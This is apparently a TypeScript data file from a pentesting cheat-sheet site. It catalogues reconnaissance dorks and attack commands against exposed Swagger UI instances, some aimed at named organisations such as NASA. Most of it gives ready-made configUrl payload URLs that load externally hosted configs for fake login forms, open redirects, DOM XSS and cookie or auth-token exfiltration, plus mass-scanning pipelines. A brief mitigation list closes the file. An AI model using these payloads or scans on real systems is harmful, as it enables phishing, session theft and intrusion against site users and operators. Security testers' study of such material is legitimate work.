export interface SwaggerXSSCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const swaggerXSSCategories: SwaggerXSSCategory[] = [
  // ==================== GOOGLE DORKS ====================
  {
    category: "Google Dorks - Find Exposed APIs",
    commands: [
      {
        command: 'site:*.swagger.io -www',
        description: "#1 Find non-root subdomains of swagger.io with exposed Swagger UI",
      },
      {
        command: 'intext:"Swagger UI" intitle:"Swagger UI" site:Target.com',
        description: "#2 Find Swagger UI on a specific target domain",
      },
      {
        command: 'site:nasa.gov inurl:(swagger-ui OR swagger.json OR swagger.yaml)',
        description: "#3 Search for Swagger endpoints on NASA's domain",
      },
      {
        command: 'inurl:"/swagger-ui/index.html"',
        description: "#4 Locate default Swagger UI paths",
      },
      {
        command: 'intitle:"Swagger UI" (inurl:"/swagger-ui/" OR inurl:"/swagger/" OR inurl:"/api-docs/" OR inurl:"/v2/api-docs" OR inurl:"/v3/api-docs" OR inurl:"swagger.json" OR inurl:"swagger.yaml") -github -gitlab -stackoverflow site:nasa.gov',
        description: "#5 Advanced: Multiple paths on NASA, filtering dev platforms",
      },
      {
        command: 'site:nasa.gov (inurl:api OR inurl:apis OR inurl:graphql OR inurl:swagger OR inurl:v1 OR inurl:v2 OR inurl:v3) (filetype:json OR filetype:yaml OR filetype:xml)',
        description: "#6 Find exposed API spec files in common API folders on NASA",
      },
    ],
  },

  // ==================== AUTOMATION ====================
  {
    category: "Automating Google Dork Results",
    commands: [
      {
        command: 'cat swagger.txt | awk -F/ \'{print $3}\' | sort -u',
        description: "Extract unique domains from swagger.txt using awk",
      },
      {
        command: 'cat swagger.txt | awk -F/ \'{print $3}\' | sort -u | nuclei -t swagger.yaml',
        description: "Pipe discovered domains to Nuclei for Swagger scanning",
      },
      {
        command: 'python dorking.py',
        description: "Use Python script for automated dorking (reference: https://sites.google.com/site/linkgopher)",
      },
    ],
  },

  // ==================== GITHUB DORKS ====================
  {
    category: "GitHub Dorks - Find Vulnerable Versions",
    commands: [
      {
        command: '"/swagger-ui-dist\\": \\"3.[1-3]/\\"" path:*/package.json',
        description: "#1 Find outdated Swagger UI versions 3.1-3.3 in GitHub repos",
      },
      {
        command: 'repo:ORG/REPO ("https://" OR "http://" OR ".com")',
        description: "#2 Search GitHub repo for hardcoded URLs/endpoints (e.g., repo:strapi/strapi)",
      },
    ],
  },

  // ==================== CENSYS ====================
  {
    category: "Censys - Find Public Swagger UIs",
    commands: [
      {
        command: 'host.services.endpoints.http.body:{"swagger", "swagger-ui"}',
        description: "#1 Censys: Find Swagger keywords in HTTP response bodies using host field",
      },
      {
        command: 'web.endpoints.http.body:{"swagger", "swagger-ui"}',
        description: "#2 Censys: Alternative search using web.endpoints.http.body field",
      },
      {
        command: 'nasa AND host.services.endpoints.http.body:{"swagger", "swagger-ui"} OR web.endpoints.http.body:{"swagger", "swagger-ui"}',
        description: "#3 Censys: Search for Swagger on NASA infrastructure",
      },
      {
        command: '(nasa AND host.services.endpoints.http.body:{"swagger", "swagger-ui"} OR web.endpoints.http.body:{"swagger", "swagger-ui"}) AND host.ip:*',
        description: "#4 Censys: Find Swagger UIs on NASA-tagged IPs with response analysis",
      },
    ],
  },

  // ==================== FOFA ====================
  {
    category: "Fofa - Find Swagger Interfaces",
    commands: [
      {
        command: '"redacted.com" && (icon_hash="-1180440057" || icon_hash="-1128940573" || icon_hash="-1839822816" || icon_hash="1120729672")',
        description: "Fofa: Find Swagger UIs using icon hash detection on redacted.com",
      },
    ],
  },

  // ==================== SHODAN ====================
  {
    category: "Shodan - Exposed Swagger Interfaces",
    commands: [
      {
        command: 'http.component:"Swagger"',
        description: "#1 Shodan: Detect services with Swagger identified in components",
      },
      {
        command: 'http.title:"Swagger UI"',
        description: "#2 Shodan: Search for pages titled Swagger UI",
      },
      {
        command: 'http.html:"swagger-ui"',
        description: "#3 Shodan: Find pages containing swagger-ui in HTML body",
      },
      {
        command: 'http.component:"Swagger" http.title:"Swagger UI" http.html:"swagger-ui"',
        description: "#4 Shodan: Combined filter for highly accurate Swagger UI detection",
      },
      {
        command: 'http.title:"Swagger UI" +200',
        description: "#5 Shodan: Look for Swagger UI returning 200 OK",
      },
      {
        command: 'http.title:"Swagger UI" hostname:"getsling.com"',
        description: "#6 Shodan: Find Swagger UIs on a specific domain (e.g., getsling.com)",
      },
    ],
  },

  // ==================== MASS HUNTING ====================
  {
    category: "Mass Hunting - Shodan Facet Analysis",
    commands: [
      {
        command: `var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='ip.txt';document.body.appendChild(a);a.click();`,
        description: "#1 Extract IPs from Shodan search results and export to text file",
      },
      {
        command: `var ipElements=document.querySelectorAll('strong'),ips=[],domains=[];ipElements.forEach(function(e){var t=e.innerHTML.replace(/["']/g,'').trim();/^(\\d{1,3}\\.){3}\\d{1,3}$/.test(t)?ips.push(t):/^(?!\\d+\\.)[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/.test(t)&&domains.push(t)});var dataString='IPs:\\n'+ips.join('\\n')+'\\n\\nDomains:\\n'+domains.join('\\n'),a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(dataString);a.download='domains.txt';document.body.appendChild(a);a.click();`,
        description: "#2 Extract both IPs and Domains from Shodan and export to file",
      },
      {
        command: 'cat ip.txt | sort -u | nuclei -t swagger.yaml',
        description: "Scan extracted IPs with Nuclei Swagger template",
      },
      {
        command: 'cat domains.txt | sort -u | nuclei -t swagger.yaml',
        description: "Scan extracted domains with Nuclei Swagger template",
      },
    ],
  },

  // ==================== SUBFINDER + HTTPX ====================
  {
    category: "Automation with Subfinder and Httpx",
    commands: [
      {
        command: 'subfinder -d target.com -all | httpx-toolkit -silent -title | grep "Swagger UI"',
        description: "#1 Find Swagger UI on all subdomains of a target",
      },
      {
        command: 'cat swagger.txt | httpx-toolkit -silent -title | grep -Ei "swagger|openapi|redoc|rapidoc"',
        description: "#2 Detect Swagger, OpenAPI, Redoc, or RapiDoc on a list of domains",
      },
      {
        command: 'echo "example.com" | httpx -path /docs,/swagger,/api-docs,/swagger-ui,/swagger-ui.html',
        description: "#3 Probe common Swagger documentation paths on a single domain",
      },
    ],
  },

  // ==================== PATH BRUTE-FORCING ====================
  {
    category: "Path Brute-Forcing with Custom Wordlists",
    commands: [
      {
        command: 'ffuf -w /root/wordlist/api/swagger_xss.txt:FUZZ -w alive_ones.txt:URL -u URLFUZZ -mc 200 -o ffuf-result.txt',
        description: "Fuzz for Swagger paths using custom wordlist and alive domains",
      },
      {
        command: 'dirsearch -u https://api.getsling.com -w payloads/swagger.txt -e html,json,yaml,js -t 20 --random-agent --force-recursive --full-url',
        description: "Dirsearch with multiple extensions for Swagger files",
      },
      {
        command: 'https://github.com/coffinxp/swagger/blob/main/swagger-wordlist.txt',
        description: "Reference: Swagger wordlist by CoffinXP",
      },
    ],
  },

  // ==================== DOM XSS - JAMF PRO ====================
  {
    category: "DOM XSS via Swagger UI - Jamf Pro",
    commands: [
      {
        command: 'https://VULNERABLE_JAMF/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy5zaGlyb3VwL3Byb2plY3RzL3dlYmhhY2tpbmdfcGxheW5kL2hlbHBlcnMvc3dhZ2dlciJ9',
        description: "Jamf Pro: Load custom Swagger login form template for phishing",
      },
      {
        command: 'https://VULNERABLE_JAMF/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHViVXNlcmNvbnRlbnQuY29tL3Byb2plY3RzL3dlYmhhY2tpbmdfcGxheW5kL2hlbHBlcnMvcmVkdXJpLnB4N3UifQ==',
        description: "Jamf Pro: Test open redirect behavior via redirecting login config",
      },
      {
        command: 'https://VULNERABLE_JAMF/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHViVXNlcmNvbnRlbnQuY29tL3Byb2plY3RzL3dlYmhhY2tpbmdfcGxheW5kL2hlbHBlcnMveHNzdGVzdC5qc29uIn0=',
        description: "Jamf Pro: Trigger basic XSS payload to check for DOM-based vulnerabilities",
      },
      {
        command: "alert(localStorage.getItem('authToken'))",
        description: "If vulnerable: extract auth token from localStorage",
      },
    ],
  },

  // ==================== DOM XSS & OPEN REDIRECT ====================
  {
    category: "DOM XSS & HTML Injection & Open Redirect",
    commands: [
      {
        command: 'https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/login.json',
        description: "#1 Loads a custom Swagger login form template for login phishing",
      },
      {
        command: 'https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/rlogin.json',
        description: "#2 Tests open redirect behavior via a redirecting login config",
      },
      {
        command: 'https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/xsstest.json',
        description: "#3 Triggers a basic XSS payload to check for DOM-based vulnerabilities",
      },
      {
        command: "https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/xsscookie.json",
        description: "#4 Executes a script to exfiltrate cookies or auth tokens from localStorage",
      },
    ],
  },

  // ==================== MITIGATION ====================
  {
    category: "Mitigation - How Developers Can Prevent",
    commands: [
      {
        command: "# Disable Swagger UI in production environments",
        description: "Avoid exposing Swagger documentation on live or customer-facing systems",
      },
      {
        command: "# Require authentication for accessing Swagger UI",
        description: "Protect Swagger routes with Basic Auth, token-based auth, or IP whitelisting",
      },
      {
        command: "# Validate and sanitize query parameters like ?url=",
        description: "Use a strict whitelist of allowed domains or remove support for remote schema loading",
      },
      {
        command: "# Use the latest stable version of Swagger UI",
        description: "Stay updated with newest releases to patch known vulnerabilities",
      },
      {
        command: "# Apply consistent input validation and escaping",
        description: "Sanitize any dynamic data rendered within Swagger UI templates",
      },
    ],
  },
]

export const swaggerVersions = [
  {
    version: "Swagger UI 2.x",
    vulnerabilities: [
      "configUrl parameter injection",
      "Reflected XSS via query parameters",
      "OpenAPI spec injection in info fields",
      "Unsanitized parameter names/descriptions",
    ],
    severity: "high",
  },
  {
    version: "Swagger UI 3.x (modern)",
    vulnerabilities: [
      "URL parameter injection (url, configUrl)",
      "DOM XSS via client-side rendering",
      "OpenAPI spec injection",
      "Template injection in some implementations",
    ],
    severity: "medium",
  },
  {
    version: "Swagger UI 4.x+ (latest)",
    vulnerabilities: [
      "Reduced attack surface with CSP",
      "Some XSS via custom plugins",
      "Misconfigured OAuth/OIDC flows",
      "Reflected XSS if CSP bypassed",
    ],
    severity: "low",
  },
]

export const swaggerTools = [
  {
    name: "Link Gopher Browser Extension",
    url: "https://sites.google.com/site/linkgopher",
    description: "Bulk open Swagger UIs and manually test each interface for vulnerabilities",
  },
  {
    name: "CoffinXP Swagger Repository",
    url: "https://github.com/coffinxp/swagger",
    description: "Complete Swagger XSS testing repository with payloads and configs",
  },
  {
    name: "Swagger Wordlist",
    url: "https://github.com/coffinxp/swagger/blob/main/swagger-wordlist.txt",
    description: "Custom wordlist for fuzzing Swagger endpoints",
  },
  {
    name: "Video: Complete Practical Guide",
    url: "https://youtu.be/FwaQ5z4EoDY",
    description: "YouTube video showing complete practical implementation of Swagger XSS method",
  },
]

